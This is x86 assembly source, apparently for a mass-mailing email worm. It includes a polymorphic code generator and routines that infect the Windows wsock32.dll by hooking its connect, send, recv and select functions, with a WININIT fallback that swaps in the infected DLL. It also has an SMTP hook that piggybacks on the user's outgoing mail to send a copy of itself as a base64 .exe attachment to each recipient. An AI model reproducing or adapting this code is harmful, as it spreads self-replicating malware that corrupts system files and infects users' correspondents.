        pop     eax
        call    freeReg
        ret
bk1:
        call    getFreeReg
        push    eax
        mov     edx,[rCnt]
        mov     ah,dl
        xchg    ah,al
        call    cmovrr

        mov     eax,[esp]
        xor     edx,edx
        inc     edx
        call    baddsub

        mov     eax,[esp]
        mov     edx,[rCnt]
        mov     ah,dl
        call    cmovrr

        pop     eax
        call    freeReg
        ret

junk:
        push    dword 4
        call    rnd
        or      eax,eax
        jz      junk1
        mov     ecx,eax
junk0:
        push    ecx
        push    dword -1
        call    rnd
        mov     edx,eax
        call    getFreeReg
        push    eax
        call    cmovri
        pop     eax
        call    freeReg
        pop     ecx
        loop    junk0
junk1:
        ret

_xormri:
        mov     ah,1
        test    dh,0ffh
        jz      __xormri8
        push    eax
        mov     al,66h
        stosb
        pop     eax
        inc     ah
__xormri8:
        dec     ah
        cmp     al,_EBP
        jne     __xormriNOEBP
        mov     al,75h
        add     ah,80h
        xchg    al,ah
        stosw
        mov     al,00
        stosb
        jmp     __xormri0
__xormriNOEBP:
        add     ah,80h
        add     al,30h
        xchg    al,ah
        stosw
__xormri0:
        test    dh,0ffh
        jz      __xormri8b
        mov     ax,dx
        stosw
        ret
__xormri8b:
        mov     al,dl
        stosb
        ret

cmovrr:
        push    eax
        push    dword 2
        call    rnd
        cmp     al,0
        jne     _cmovrr0
        pop     eax
        jmp     bmovrr
_cmovrr0:
        pop     eax
        cmp     byte [freer],0
        je      bmovrr
        push    eax
        call    getFreeReg
        push    eax
        mov     dl,al
        mov     eax,[esp+4]
        mov     ah,dl
        call    cmovrr
        pop     eax
        call    freeReg
        mov     dl,al
        pop     eax
        mov     al,dl
        jmp     cmovrr

bmovrr:
        push    eax
        push    dword 2
        call    rnd
        cmp     al,0
        jne     _bmovrr0
        pop     eax
        jmp    _movrr0
_bmovrr0:
        pop     eax
        jmp    _movrr1
        
freeReg:
        mov     byte [eax+registers],0
        inc     byte [freer]
        ret
getFreeReg:
        push    dword 7
        call    rnd
        cmp     byte [eax+registers],0
        jne     getFreeReg
        mov     byte [eax+registers],1
        dec     byte [freer]
        ret
cmovri:
        push    eax
        push    edx
        push    dword 3
        call    rnd
        cmp     al,0
        jne     _cmovri0
        pop     edx
        pop     eax
        jmp     bmovri
_cmovri0:
        cmp     al,1
        jne     _cmovri1
        pop     edx
        pop     eax
        cmp     byte [freer],0
        je      bmovri
        push    eax
        push    edx
        call    getFreeReg
        pop     edx
        push    eax
        push    edx
        call    cmovri
        pop     edx
        pop     eax
        mov     dl,al
        call    freeReg
        pop     eax
        xchg    al,ah
        mov     al,dl
        jmp     cmovrr
_cmovri1:
        push    dword -1
        call    rnd
        or      eax,eax
        jz      _cmovri1
        test    eax,17
        jz      _cmovri1c
        push    eax
_cmovri1b:
        push    dword -1
        call    rnd
        or      eax,eax
        jz      _cmovri1b
        rol     eax,16
        pop     edx
        adc     eax,edx
_cmovri1c:
        pop     edx
        add     edx,eax
        pop     ecx
        push    eax
        push    ecx
        mov     eax,ecx
        call    cmovri
        pop     eax
        pop     edx
        jmp     near baddsub

bmovri:
        push    eax
        push    edx
        push    dword 3
        call    rnd
        cmp     al,0
        jne     _bmovri0
        pop     edx
        pop     eax
        jmp    _movri0
_bmovri0:
        cmp     al,1
        jne     _bmovri1
        pop     edx
        pop     eax
        jmp    _movri1
_bmovri1:
        pop     edx
        pop     eax
        jmp    _movri2

_movrr0:
        cmp     ah,al
        je      __movrr00
        shl     ah,3
        or      ah,al
        or      ah,0c0h
        mov     al,8bh
        stosw
__movrr00:
        ret
_movrr1:
        cmp     ah,al
        je      __movrr10
        call    _pushr
        xchg    al,ah
        call    _popr
__movrr10:
        ret

_movri0:
        shl     al,3
        or      al,5
        mov     ah,8dh
        xchg    al,ah
        stosw
        mov     eax,edx
        stosd
        ret
_movri1:
        add     al,0b8h
        stosb
        mov     eax,edx
        stosd
        ret
_movri2:
        push    eax
        call    _pushi
        pop     eax
        call    _popr
        ret

_addri:
        or      al,al
        jnz     __addri0
        mov     al,05h
        stosb
        jmp     __addri1
__addri0:
        push    eax
        mov     al,081h
        stosb
        pop     eax
        add     al,0c0h
        stosb
__addri1:
        mov     eax,edx
        stosd
        ret

_subri:
        or      al,al
        jnz     __subri0
        mov     al,2dh
        stosb
        jmp     __subri1
__subri0:
        push    eax
        mov     al,081h
        stosb
        pop     eax
        add     al,0e8h
        stosb
__subri1:
        mov     eax,edx
        stosd
        ret

_pushr:
        add     al,050h
        stosb
        ret

_popr:
        add     al,058h
        stosb
        ret

_pushi:
        mov     al,068h
        stosb
        mov     eax,edx
        stosd
        ret

baddsub:
        push    eax
        push    edx
        push    dword 2
        call    rnd
        cmp     al,0
        jne     _baddsub0
        pop     edx
        pop     eax
        jmp     _subri
_baddsub0:
        pop     edx
        pop     eax
        not     edx
        inc     edx
        jmp     _addri

_orrr:
        mov     cl,9
        mul     cl
        add     al,0c0h
        mov     ah,09h
        xchg    ah,al
        stosw
        ret

_addmri:
        mov     ah,1
        test    dh,0ffh
        jz      __addmri8
        push    eax
        mov     al,66h
        stosb
        pop     eax
        inc     ah
__addmri8:
        dec     ah
        cmp     al,_EBP
        jne     __addmriNOEBP
        mov     al,45h
        add     ah,80h
        xchg    al,ah
        stosw
        mov     al,00
        stosb
        jmp     __addmri0
__addmriNOEBP:
        add     ah,80h
        xchg    al,ah
        stosw
__addmri0:
        test    dh,0ffh
        jz      __addmri8b
        mov     ax,dx
        stosw
        ret
__addmri8b:
        mov     al,dl
        stosb
        ret

_submri:
        mov     ah,1
        test    dh,0ffh
        jz      __submri8
        push    eax
        mov     al,66h
        stosb
        pop     eax
        inc     ah
__submri8:
        dec     ah
        cmp     al,_EBP
        jne     __submriNOEBP
        mov     al,6dh
        add     ah,80h
        xchg    al,ah
        stosw
        mov     al,00
        stosb
        jmp     __submri0
__submriNOEBP:
        add     ah,80h
        add     al,28h
        xchg    al,ah
        stosw
__submri0:
        test    dh,0ffh
        jz      __submri8b
        mov     ax,dx
        stosw
        ret
__submri8b:
        mov     al,dl
        stosb
        ret

; - poly.inc EOF -
; - wsock.inc BOF -

[extern CreateFileA]
[extern CloseHandle]
[extern GetFileSize]
[extern CreateFileMappingA]
[extern MapViewOfFile]
[extern UnmapViewOfFile]
[extern GetSystemDirectoryA]
[extern GetWindowsDirectoryA]
[extern CopyFileA]
[extern lstrcat]
[extern DeleteFileA]

installMailHook:
        push    ebp
        mov     ebp,esp
        sub     esp,260
        push    ebp
        sub     ebp,260

        not     dword [fmaskall]
        call    scansubject

        not     dword [wsock32dll]
        not     dword [wsock32dll+4]

        push    dword 260
        push    ebp
        call    GetSystemDirectoryA
        or      eax,eax
        jz      unableToHookMail

        push    dword wsock32dll
        push    ebp
        call    lstrcat

        mov     esi,ebp
        call    infectws

        mov     al,byte [hkey]
        or      al,al
        jz      wininitStuff

unableToHookMail:
        pop     ebp
        leave
        ret        

wininitStuff:
        not     dword [wininitstr]
        not     dword [wininitstr+4]
        not     dword [wininit]

        push    dword 128
        push    ebp
        call    GetSystemDirectoryA
        or      eax,eax
        jz      unableToHookMail

        push    dword 128
        mov     esi,ebp
        add     esi,128
        mov     [fHnd],esi
        push    esi
        call    GetSystemDirectoryA
        or      eax,eax
        jz      unableToHookMail

        push    dword wsock32dllp
        push    dword [fHnd]
        call    lstrcat

        mov     byte [wsock32dll+10],'_'
        push    dword wsock32dllp
        push    ebp
        call    lstrcat

        push    dword 1
        push    ebp
        push    dword [fHnd]
        call    CopyFileA
        or      eax,eax
        jz      near unableToAddWininit

        push    dword [fHnd]
        mov     esi,ebp
        call    infectws
        pop     dword [fHnd]

        mov     al,byte [hkey]
        or      al,al
        jz      near unableToAddWininitPanic

        push    dword 128
        push    dword [fHnd]
        call    GetWindowsDirectoryA
        or      eax,eax
        jz      near unableToAddWininit

        push    dword wininit
        push    dword [fHnd]
        call    lstrcat

        push    dword 0
        push    dword 80h
        push    dword 2h
        push    dword 0
        push    dword 0
        push    dword 40000000h
        push    dword [fHnd]
        call    CreateFileA
        inc     eax
        jz      near unableToAddWininit
        dec     eax

        push    eax
        push    dword 0
        push    dword localtime
        push    dword wininitstrLen
        push    dword wininitstr
        push    eax
        call    WriteFile

        mov     esi,ebp
        xor     ecx,ecx
strsizeLoop:
        lodsb
        inc     ecx
        or      al,al
        jnz     strsizeLoop
        dec     ecx

        mov     byte [esi-2],'l'

        pop     eax
        push    ecx
        push    esi
        push    eax
        push    dword 0
        push    dword localtime
        push    ecx
        push    ebp
        push    eax
        call    WriteFile

        mov     eax,[esp]
        mov     byte [wininitstr],'='
        push    dword 0
        push    dword localtime
        push    dword 1
        push    dword wininitstr
        push    eax
        call    WriteFile

        pop     eax
        pop     esi
        pop     ecx
        push    eax

        mov     byte [esi-2],'_'
        push    dword 0
        push    dword localtime
        push    ecx
        push    ebp
        push    eax
        call    WriteFile

        call    CloseHandle

unableToAddWininit:
        pop     ebp
        leave
        ret

unableToAddWininitPanic:
        push    ebp
        call    DeleteFileA

        jmp     unableToAddWininit


infectws:
        mov     byte [hkey],0

        push    dword 0
        push    dword 80h
        push    dword 3
        push    dword 0
        push    dword 0
        push    dword (80000000h | 40000000h)
        push    esi
        call    CreateFileA
        inc     eax
        jz      near infwsError
        dec     eax

        mov     [fHnd],eax

        push    dword 0
        push    eax
        call    GetFileSize
        inc     eax
        jz      near infwsErrorClose
        dec     eax

        mov     [fileSize],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd]
        call    CreateFileMappingA
        or      eax,eax
        jz      near infwsErrorClose

        mov     dword [fhmap],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap]
        call    MapViewOfFile
        or      eax,eax
        jz      near infwsErrorCloseMap

        mov     [mapMem],eax

        mov     edi,eax
        cmp     word [edi],'MZ'
        jne     near infwsErrorCloseUnmap

        add     edi,[edi+3ch]
        cmp     word [edi],'PE'
        jne     near infwsErrorCloseUnmap

        mov     esi,edi
        mov     eax,18h
        add     ax,[edi+14h]
        add     edi,eax

        mov     cx,[esi+06h]
        dec     cx
        mov     eax,28h
        mul     cx
        add     edi,eax

        mov     ecx,[edi+14h]
        add     ecx,[edi+10h]

        cmp     ecx,[fileSize]
        jne     near infwsErrorCloseUnmap

        mov     ebx,[edi+0ch]
        add     ebx,[edi+10h]
        mov     eax,[esi+34h]
        mov     [_wsockhookbase],ebx
        add     [_wsockhookbase],eax
        mov     eax,~'conn'
        not     eax
        call    patchAPI
        jc      near infwsErrorCloseUnmap
        add     eax,[esi+34h]
        mov     [_connect],eax

        add     ebx,my_send-my_connect
        mov     eax,~'send'
        not     eax
        call    patchAPI
        jc      near infwsErrorCloseUnmap
        add     eax,[esi+34h]
        mov     [_send],eax

        xor     ebx,ebx
        mov     eax,~'recv'
        not     eax
        call    patchAPI
        jc      near infwsErrorCloseUnmap
        add     eax,[esi+34h]
        mov     [_recv],eax

        mov     eax,~'sele'
        not     eax
        call    patchAPI
        jc      near infwsErrorCloseUnmap
        add     eax,[esi+34h]
        mov     [_select],eax

        xor     eax,eax
        mov     [esi+58h],eax

        or      dword [edi+24h],0c0000000h

        mov     eax,wsockHookSize
        add     eax,[attachmentSize]
        push    eax
        add     eax,[edi+10h]
        mov     ecx,[esi+3ch]
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     [edi+10h],eax

        add     eax,[edi+0ch]
        mov     ecx,[esi+38h]
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     [esi+50h],eax
        sub     eax,[edi+0ch]
        mov     [edi+08h],eax

        pop     eax
        add     eax,[fileSize]
        push    eax
repeatRndPadding:
        push    dword 200h
        call    rnd
        or      eax,eax
        jz      repeatRndPadding
        add     dword [esp],eax
        pop     dword [padding]

        push    dword [mapMem]
        call    UnmapViewOfFile

        push    dword [fhmap]
        call    CloseHandle

        xor     eax,eax
        push    eax
        push    dword [padding]
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd]
        call    CreateFileMappingA
        or      eax,eax
        jz      infwsErrorClose

        mov     [fhmap],eax

        xor     eax,eax
        push    dword [padding]
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap]
        call    MapViewOfFile
        or      eax,eax
        jz      infwsErrorCloseMap

        mov     [mapMem],eax

        mov     ecx,wsockHookSize
        lea     esi,[wsockHookBegin]
        mov     edi,eax
        add     edi,dword [fileSize]
        rep     movsb
        mov     ecx,[attachmentSize]
        mov     esi,[attachment]
        rep     movsb

        mov     byte [hkey],1

infwsErrorCloseUnmap:
        push    dword [mapMem]
        call    UnmapViewOfFile

infwsErrorCloseMap:
        push    dword [fhmap]
        call    CloseHandle

infwsErrorClose:
        push    dword [fHnd]
        call    CloseHandle

infwsError:
        ret

; ECX: PE header EAX: rva shit
; out EAX: raw
rva2raw:
        push    eax
        pushad
        mov     esi,eax
        mov     edx,ecx
        mov     eax,18h
        add     ax,[edx+14h]
        add     edx,eax
        movzx   ecx,word [ecx+06h]
        xor     ebp,ebp
rva2rawLoop:
        mov     edi,[edx+ebp+0ch]
        add     edi,[edx+ebp+8]
        cmp     esi,edi
        jb      foundDamnSect
nextSectPlz:
        add     ebp,28h
        loop    rva2rawLoop
        popad
        pop     eax
        stc
        ret
foundDamnSect:
        sub     esi,[edx+ebp+0ch]
        add     esi,[edx+ebp+14h]
        mov     dword [esp+20h],esi
        popad
        pop     eax
        clc
        ret

patchAPI:
        push    eax
        pushad
        mov     edi,eax
        mov     ecx,esi

        mov     edx,[esi+78h]
        or      edx,edx
        jz      patchAPIError
        add     edx,[mapMem]
        mov     esi,[edx+20h]
        or      esi,esi
        jz      patchAPIError
        mov     eax,esi
        call    rva2raw
        jc      patchAPIError

        mov     esi,eax
        add     esi,[mapMem]
        xor     ebp,ebp
hookApiLoop:
        mov     eax,[esi+ebp*2]
        call    rva2raw
        jc      patchAPIError
        add     eax,[mapMem]
        cmp     [eax],edi
        je      APIFound
        add     ebp,2
        jmp     hookApiLoop
APIFound:
        mov     eax,[edx+24h]
        call    rva2raw
        jc      patchAPIError
        add     eax,[mapMem]
        movzx   ebp,word [eax+ebp]
        mov     eax,[edx+1ch]
        call    rva2raw
        jc      patchAPIError
        add     eax,[mapMem]
        or      ebx,ebx
        jnz     justPatch
        mov     ebx,[eax+ebp*4]
        jmp     saveOldAddr
justPatch:
        xchg    ebx,[eax+ebp*4]
saveOldAddr:
        mov     [esp+20h],ebx

        popad
        pop     eax
        clc
        ret
patchAPIError:
        popad
        pop     eax
        stc
        ret

; - wsock.inc EOF -

; - wsockhook.inc BOF -

RCPTTOLEN       equ     128

wsockHookBegin:

my_connect:
        pushad
        call    inithook

        mov     eax,~'FREE'
sem     equ     $-4
        cmp     eax,~'BUSY'
        je      _my_connect0

        mov     eax,dword [esp+28h]
        mov     ax,word [eax+2]
        cmp     ax,1900h
        jne     _my_connect0

_my_connect1:
        mov     eax,[esp+24h]
        mov     dword [listenSocket+ebp],eax

_my_connect0:
        mov     eax,[_connect+ebp]
        xchg    [esp+20h],eax
        mov     [_connect_caller+ebp],eax
        popad
        pop     eax
        call    eax
        sub     esp,0ch
        push    dword 12345678h
_connect_caller equ $-4
        retn    0ch

my_send:
        pushad
        call    inithook

        mov     eax,[sem+ebp]
        cmp     eax,~'BUSY'
        je      _my_send0

        mov     eax,-1
listenSocket    equ $-4
        inc     eax
        jz      _my_send0
        dec     eax

        cmp     eax,[esp+24h]
        jne     _my_send0

        jmp     _my_send1

_my_send0:
        mov     eax,[_send+ebp]
        xchg    [esp+20h],eax
        mov     [_send_caller+ebp],eax
        popad
        pop     eax
        call    eax
        sub     esp,10h
        push    dword 12345678h
_send_caller    equ $-4
        retn    10h

_my_send1:
        mov     esi,[esp+28h]
        mov     edi,[esp+2ch]
        cmp     edi,6
        jb      _my_send0

        mov     eax,dword [esi]
        and     eax,~20202020h
        cmp     eax,'RCPT'
        jne     __my_send1_2

        call    my_send_get_rcpt
        jmp     _my_send0
__my_send1_2:
        cmp     eax,'QUIT'
        jne     _my_send0
        cmp     word [esi+4],0a0dh
        jne     _my_send0

        mov     dword [sem+ebp],~'BUSY'

        cmp     byte [rcptto+ebp],0
        je      __my_send1_3

        call    smtp

__my_send1_3:
        xor     eax,eax
        dec     eax
        mov     dword [listenSocket+ebp],eax
        mov     dword [sem+ebp],~'FREE'

        jmp     _my_send0

my_send_get_rcpt:
        mov     ecx,edi
        add     ecx,esi
        lea     edi,[rcptto+ebp]
        mov     byte [edi],0
my_send_get_rcpt1:
        cmp     byte [esi],':'
        je      my_send_get_rcpt0
        inc     esi
        cmp     esi,ecx
        jb      my_send_get_rcpt1
        ret
my_send_get_rcpt0:
        inc     esi
        mov     ebx,RCPTTOLEN
        add     ebx,edi
my_send_get_rcpt3:
        cmp     esi,ecx
        jnb     my_send_get_rcpt4
        cmp     edi,ebx
        jb      my_send_get_rcpt2
my_send_get_rcpt4:
        mov     byte [rcptto+ebp],0
        ret
my_send_get_rcpt2:
        movsb
        cmp     byte [esi],0dh
        jne     my_send_get_rcpt3
        movsb
        mov     ax,000ah
        stosw
        ret

inithook:
        call    _inithook0
_inithook0:
        pop     ebp
        sub     ebp,dword _inithook0

        lea     esi,[_wsockhookbase+ebp]
        mov     ecx,[esi]
        jecxz   _inithook1

        lea     eax,[my_connect+ebp]
        sub     eax,ecx
        add     [_connect+ebp],eax
        add     [_send+ebp],eax
        add     [_recv+ebp],eax
        add     [_select+ebp],eax
        xor     eax,eax
        mov     dword [esi],eax
        mov     [hseed+ebp],esp
_inithook1:
        ret

smtp:
        push    ebp
        mov     ebp,esp
        sub     esp,512
        push    ebp
        sub     ebp,512

        call    @sendMail0
@sendMail0:
        pop     ebx
        sub     ebx,dword @sendMail0

        mov     ecx,8
        mov     eax,[hseed+ebx]
        lea     esi,[rndFrom+ebx]
fromRndLoop:
        mov     byte [esi],al
        and     byte [esi],0fh
        add     byte [esi],'a'
        rol     eax,3
        add     eax,[rcptto+ebx]
        inc     esi
        loop    fromRndLoop
        add     [hseed+ebx],eax

        lea     edi,[cmd0+ebx]
        call    rcchain
        jc      near @sendMailOut

        push    dword sizeCmd1
        lea     edi,[cmd1+ebx]
        push    edi
        call    __send

        lea     esi,[rcptto+ebx]
        push    esi
@sendMail1:
        lodsb
        or      al,al
        jnz     @sendMail1
        sub     esi,[esp]
        dec     esi
        xchg    [esp],esi
        push    esi
        call    __send

        mov     byte [ebp],0
        push    dword 512
        push    ebp
        call    __recv

        cmp     byte [ebp],'2'
        je      @sendMail2
        cmp     byte [ebp],'3'
        jne     near @sendMailOut
@sendMail2:

        lea     edi,[cmd2+ebx]
        call    rcchain
        jc      near @sendMailOut

        push    dword body0Size
        lea     edi,[body0+ebx]
        push    edi
        call    __send

        cmp     byte [pflag+ebx],0
        jne     weHaveSubject
        lea     edi,[gsubject+ebx]
        lea     esi,[rndFrom+ebx]
        mov     ecx,8
        mov     [ssubj+ebx],ecx
        rep     movsb

        jmp     skipThisSubject
weHaveSubject:
        push    dword [ssubj+ebx]
        lea     edi,[gsubject+ebx]
        push    edi
        call    __send

skipThisSubject:
        push    dword body1Size
        lea     edi,[body1+ebx]
        push    edi
        call    __send

        push    dword [ssubj+ebx]
        lea     edi,[gsubject+ebx]
        push    edi
        call    __send

        push    dword body2Size
        lea     edi,[body2+ebx]
        push    edi
        call    __send

        push    dword [ssubj+ebx]
        lea     edi,[gsubject+ebx]
        push    edi
        call    __send

        push    dword body3Size
        lea     edi,[body3+ebx]
        push    edi
        call    __send

        push    dword [attachmentSize+ebx]
        lea     edi,[_attachment+ebx]
        push    edi
        call    __send

        lea     edi,[bodyEnd+ebx]
        call    rcchain

@sendMailOut:
        pop     ebp
        leave
        ret

rcchain:
        push    ebx
        xor     ebx,ebx
        mov     bl,byte [edi]
        inc     edi
        push    ebx
        push    edi
        call    __send

        mov     byte [ebp],0
        push    dword 512
        push    ebp
        call    __recv

        cmp     byte [ebp],'2'
        je      @rcchain1
        cmp     byte [ebp],'3'
        je      @rcchain1
        stc
        mov     al,0f8h
@rcchain1       equ $-1
        pop     ebx
        ret

__recv:
        push    edx
        mov     edx,esp
        pushad
        call    inithook

        push    edx
        lea     esi,[fd_fdset+ebp]
        mov     dword [esi],1
        mov     eax,[listenSocket+ebp]
        mov     [esi+4],eax
        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    esi
        push    eax
        call    dword [_select+ebp]
        pop     edx
        inc     eax
        jz      __recv_out

        push    dword 0
        push    dword [edx+12]
        push    dword [edx+8]
        push    dword [listenSocket+ebp]
        call    dword [_recv+ebp]
__recv_out:
        popad
        pop     edx
        retn    8

__send:
        push    edx
        mov     edx,esp
        pushad
        call    inithook

__send_retry:
        push    edx
        lea     esi,[fd_fdset+ebp]
        mov     dword [esi],1
        mov     eax,[listenSocket+ebp]
        mov     [esi+4],eax
        xor     eax,eax
        push    eax
        push    eax
        push    esi
        push    eax
        push    eax
        call    dword [_select+ebp]
        pop     edx
        inc     eax
        jz      __send_out

        push    edx
        push    dword 0
        push    dword [edx+12]
        push    dword [edx+8]
        push    dword [listenSocket+ebp]
        call    dword [_send+ebp]
        pop     edx
        inc     eax
        jz      __send_retry
        dec     eax
        or      eax,eax
        jz      __send_out
        cmp     eax,[edx+12]
        je      __send_out
        add     [edx+8],eax
        sub     [edx+12],eax
        jmp     __send_retry
__send_out:
        popad
        pop     edx
        retn    8

cmd0            db      sizeCmd0-1,'MAIL FROM:<'
; duh! i wonder why avp called it manyx... ;)
rndFrom         db      'xxxxxxxx@hotmail.com>',0dh,0ah
sizeCmd0        equ     $-cmd0
cmd1            db      'RCPT TO:'
sizeCmd1        equ     $-cmd1
cmd2            db      sizeCmd2-1,'DATA',0dh,0ah
sizeCmd2        equ     $-cmd2

body0           db      'Subject:'
body0Size       equ     $-body0
body1           db      0dh,0ah
                db      'MIME-Version: 1.0',0dh,0ah
                db      'Content-Type: multipart/mixed; boundary="-=_NextPart_00"',0dh,0ah
                db      'X-Priority: 3',0dh,0ah
                db      0dh,0ah,'---=_NextPart_00',0dh,0ah
                db      'Content-Type: text/plain; charset=us-ascii',0dh,0ah,0dh,0ah
                db      ' ',0dh,0ah,'---=_NextPart_00',0dh,0ah
                db      'Content-Type: application/octet-stream; name="'
body1Size       equ     $-body1
body2           db      '.exe"',0dh,0ah,'Content-Transfer-Encoding: base64',0dh,0ah
                db      'Content-Disposition: attachment; filename="'
body2Size       equ     $-body2
body3           db      '.exe"',0dh,0ah,0dh,0ah
body3Size       equ     $-body3
bodyEnd         db      bodyEndSize-1,0dh,0ah,0dh,0ah,'---=_NextPart_00--'
                db      0dh,0ah,0dh,0ah,'.',0dh,0ah
bodyEndSize     equ     $-bodyEnd


_wsockhookbase  dd      0
_connect        dd      0
_send           dd      0
_recv           dd      0
_select         dd      0
fd_fdset        dd      0,0

hseed           dd      0
ssubj           dd      0
gsubject        times   64 db 0
pflag           db      0

rcptto          times   RCPTTOLEN db 0

attachmentSize  dd      0
wsockHookSize   equ $-wsockHookBegin
_attachment:

; - wsockhook.inc EOF -
; END OF SOURCE --

